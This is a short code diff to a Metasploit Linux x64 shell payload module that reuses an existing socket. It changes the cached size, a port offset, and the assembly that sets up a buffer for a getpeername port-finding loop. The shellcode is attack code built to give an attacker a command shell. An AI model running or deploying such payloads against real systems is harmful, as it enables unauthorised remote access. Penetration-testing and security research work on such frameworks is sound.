@@ -9,7 +9,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 91
+  CachedSize = 98
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
@@ -29,16 +29,17 @@ module MetasploitModule
         {
           'Offsets' =>
             {
-              'CPORT' => [ 32, 'n' ],
+              'CPORT' => [ 39, 'n' ],
             },
 
           'Assembly' => %Q|
             xor rdi,rdi
             xor rbx,rbx
-            mov bl,0x14
+            mov bl,0x18
             sub rsp,rbx
             lea rdx,[rsp]
-            lea rsi,[rsp+4]
+            mov [rdx], 0x10
+            lea rsi,[rsp+8]
           find_port:
             push 0x34     ; getpeername
             pop rax
